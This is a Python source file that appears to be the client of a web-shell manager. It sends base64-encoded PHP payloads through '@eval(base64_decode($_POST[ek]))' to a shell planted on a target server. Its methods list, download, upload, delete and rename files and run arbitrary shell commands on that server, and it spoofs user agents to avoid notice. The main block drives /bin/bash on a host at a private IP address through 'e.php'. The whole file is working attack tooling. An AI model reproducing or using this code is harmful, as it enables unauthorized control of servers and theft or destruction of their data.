import requests
from nife.core.phpCodeFun import *
from nife.core.fakeUseAgent import fake_agent
import json
import os
from django.conf import settings
from lxml import etree
import base64
os.environ.setdefault("DJANGO_SETTINGS_MODULE", "WCnife.settings")

class SendCode(object):

    def __init__(self, url, pwd):
        self.url = url
        self.pwd = pwd
        self.data = dict()
        self.data[pwd]="@eval(base64_decode($_POST[ek]));"
        self.data["ek"] = ""
        self.r = requests.session()

    def getFilePath(self):
        """
        返回当前文件在目标服务器的绝对路径
        :return:
        """
        self.data["ek"] = getFilePathBase()
        header = {
            "User-Agent": fake_agent()
        }
        res = self.r.post(url=self.url, data=self.data, headers=header)
        page = etree.HTML(res.text)
        val = page.xpath('//ek/text()')[0]
        path = json.loads(val)['path']
        if '\\' in path:
            path = path.replace('\\', "/")
        return path

    def getFilelist(self, path):
        """
        返回文件列表
        :param path:
        :return:
        """
        self.data["ek"] = getFilelistBase(path=path)
        header = {
            "User-Agent": fake_agent()
        }
        res = self.r.post(url=self.url, data=self.data, headers=header)
        page = etree.HTML(res.text)
        val = page.xpath('//ek/text()')[0]
        file_list = json.loads(val)
        file_list = [x for x in file_list if x['name'] not in ['.', '..']]
        return file_list

    def getFile(self, name, path):
        """
        保存文件到服务器，返回文件的路径
        :param path:
        :return:

        """
        self.data["ek"] = getFile(path=path)
        header = {
            "User-Agent": fake_agent()
        }
        # res = self.r.post(url=self.url, data=self.data, headers=header, proxies={"http": '127.0.0.1:8080'})
        res = self.r.post(url=self.url, data=self.data, headers=header)
        filepath = settings.TMP_DIR + name
        # 存储到本地
        with open(filepath, 'wb') as f:
            f.write(res.content)
        return filepath

    def deleteFile(self, path):
        """
        删除文件
        :param path:
        :return: 1 or 0
        """
        self.data["ek"] = deleteFile(path=path)
        header = {
            "User-Agent": fake_agent()
        }
        # res = self.r.post(url=self.url, data=self.data, headers=header, proxies={"http": '127.0.0.1:8080'})
        res = self.r.post(url=self.url, data=self.data, headers=header)
        page = etree.HTML(res.text)
        val = page.xpath('//ek/text()')[0]
        return val

    def uploadFile(self, path, content):
        """
        上传文件
        :param path:
        :param name:
        :return:
        """
        self.data['ek'] = uploadFile(path=path, content=content)
        header = {
            "User-Agent": fake_agent()
        }
        # res = self.r.post(url=self.url, data=self.data, headers=header, proxies={"http": '127.0.0.1:8081'})
        res = self.r.post(url=self.url, data=self.data, headers=header)
        page = etree.HTML(res.text)
        val = page.xpath('//ek/text()')[0]
        return val

    def renameFile(self, path, newnamepath):
        """
        重命名文件或文件夾
        :param path:
        :param newname:
        :return:
        """
        self.data['ek'] = changeName(path=path, newnamepath=newnamepath)
        header = {
            "User-Agent": fake_agent()
        }
        # res = self.r.post(url=self.url, data=self.data, headers=header, proxies={"http": '127.0.0.1:8081'})
        res = self.r.post(url=self.url, data=self.data, headers=header)
        page = etree.HTML(res.text)
        val = page.xpath('//ek/text()')[0]
        return val

    def createFile(self, path, content):
        """
        新建文件
        :param path:
        :param content:
        :return:
        """
        self.data['ek'] = createFile(path=path, content=content)
        header = {
            "User-Agent": fake_agent()
        }
        # res = self.r.post(url=self.url, data=self.data, headers=header, proxies={"http": '127.0.0.1:8081'})
        res = self.r.post(url=self.url, data=self.data, headers=header)
        page = etree.HTML(res.text)
        val = page.xpath('//ek/text()')[0]
        return val

    def createDir(self, path):
        """
        新建路径
        :param path:
        :return:
        """
        self.data['ek'] = createDir(path=path)
        header = {
            "User-Agent": fake_agent()
        }
        res = self.r.post(url=self.url, data=self.data, headers=header)
        page = etree.HTML(res.text)
        val = page.xpath('//ek/text()')[0]
        return val

    def execCreate(self):
        """
        创建shell
        :return:网站目录和操作系统
        """
        self.data['ek'] = execShellCreate()
        header = {
            "User-Agent": fake_agent()
        }
        res = self.r.post(url=self.url, data=self.data, headers=header)
        page = etree.HTML(res.text)
        val = page.xpath('//ek/text()')[0]
        val = val.split('\t')
        # 0 windows 1 linux
        ops = 0
        if 'linux' in val[2].lower():
                ops = 1
        return val[0], ops

    def execShell(self, cmd, options):
        """
        执行命令
        :param cmd:
        :param options:
        :return:
        """
        cmd = base64.b64encode(cmd.encode("UTF-8")).decode("UTF-8")
        options = base64.b64encode(options.encode("UTF-8")).decode("UTF-8")
        self.data['ek'] = execShell(cmd=cmd, options=options)
        header = {
            "User-Agent": fake_agent()
        }
        res = self.r.post(url=self.url, data=self.data, headers=header)
        res.encoding = res.apparent_encoding
        res = res.text.replace('->|', '')
        res = res.split('|<-')
        # page = etree.HTML(res.text)
        # val = str(page.xpath('//ek/text()')[0])
        splitres = res[0].split("[S]")
        cmdres = splitres[0]
        newdir = splitres[1].replace('[E]', '').strip()
        return cmdres, newdir


if __name__ == '__main__':
    # s = SendCode("http://172.28.100.13/PhpstormProjects/Cnife/eval_fun.php", 'cmd')
    # s = SendCode("http://172.28.100.84/evil.php", 'cmd')
    # path = s.deleteFile("C:/Users/elloit/Desktop/php/PHPTutorial/WWW/121/")
    # s = SendCode("http://172.28.100.84/evil.php", 'cmd')
    s = SendCode("http://172.28.100.85:8080/e.php", 'cmd')
    # path = s.createDir(path='/var/www/html/asdadasd/888/')
    # path = s.execCreate()
    path = s.execShell("/bin/bash", 'cd "/var/www/html/";cd ..;echo [S];pwd;echo [E]')
    # path = s.execShell("cmd", r'cd/d"c:\Users\elloit\Desktop\php\PHPTutorial\WWW\"&dir&echo [S]&cd&echo [E]')
    print(path)

